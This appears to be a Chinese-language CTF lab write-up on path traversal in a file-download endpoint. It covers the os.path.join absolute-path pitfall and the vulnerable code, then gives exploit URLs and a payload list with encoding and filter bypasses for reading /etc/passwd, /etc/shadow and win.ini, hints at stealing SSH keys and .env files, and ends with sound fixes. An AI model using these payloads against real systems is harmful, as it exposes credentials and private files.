# 网盘下载处的路径穿越

## 这一题在教什么

两件事，都很容易踩：

1. **`../` 没有被拦住**，就能走出服务端本来只想让你待着的目录。
2. **Python 的 `os.path.join` 有个坑**：如果第二个参数以 `/` 开头，它会**直接顶掉**
   前面的基准路径，而不是拼在后面。

```python
>>> import os
>>> os.path.join('/srv/files', 'a.txt')
'/srv/files/a.txt'
>>> os.path.join('/srv/files', '/etc/passwd')
'/etc/passwd'          # ← 基准目录整个没了
```

很多人以为写 `os.path.join(BASE, user_input)` 就安全了。不是。

## 漏洞在哪

`module.py` 的 `download()`：

```python
target = shared / name          # shared = <workspace>/共享文档
content = Path(target).read_text(...)
```

`name` 来自 `?name=`，一个字符都没检查。

## 怎么打通

**一、相对穿越**，读出共享目录旁边的"内部资料"：

```
/download?name=../内部资料/薪资表.csv
```

**二、绝对路径顶掉基准目录**：

```
/download?name=/etc/passwd
```

`shared / "/etc/passwd"` 在 pathlib 里的结果是 `/etc/passwd`。

**三、怎么数 `../` 的数量。** 页面出错时会把服务器真正尝试打开的绝对路径回显出来，
照着那个路径数层级就行 —— 这本身也是个真实的错误（报错泄露路径结构）。

## 现实里怎么找

看到任何**把文件名/路径当参数**的地方都要试：

```
?file=../../../../etc/passwd
?file=....//....//etc/passwd          # 只删一次 ../ 的过滤器
?file=..%2f..%2fetc%2fpasswd          # URL 编码
?file=%252e%252e%252fetc%252fpasswd   # 双重编码
?file=..././..././etc/passwd
?path=/var/www/uploads/../../etc/shadow
```

Windows 上还要试 `..\..\windows\win.ini`、`C:\windows\win.ini`、
以及 `....\/` 这类混合写法。

## 怎么修

**核心原则：先规范化，再校验它还在允许的目录里。别用字符串判断。**

```python
from pathlib import Path

BASE = Path("/srv/files").resolve()

def safe_path(user_input: str) -> Path:
    target = (BASE / user_input).resolve()
    if not str(target).startswith(str(BASE) + os.sep):
        raise PermissionError("越界了")
    return target
```

`resolve()` 会把 `..`、软链接、多余的 `/` 都展开，展开完再比前缀，
`../` 就没用了。

Python 3.9+ 更稳的写法（能正确处理路径边界）：

```python
try:
    target.relative_to(BASE)
except ValueError:
    raise PermissionError("越界了")
```

配套：

1. **别用用户给的文件名当路径**。用 ID 查表 → 服务端映射到真实路径。
2. **白名单后缀**，不要黑名单。
3. **权限检查**：就算路径没越界，也要确认这个文件属于当前用户。
4. **别把绝对路径回显给用户**，统一返回"文件不存在"。

## 顺手想想

- 如果代码是 `if ".." not in name: ...`，怎么绕？（提示：`....//`、URL 编码、
  以及"删掉一次 `..` 之后剩下的拼起来正好又是 `..`"）
- 如果服务器是 Windows，`/etc/passwd` 读不到，你会试什么？
- 只能读不能写的话，危害有多大？（想想 `.ssh/id_rsa`、`config.py`、`.env`）
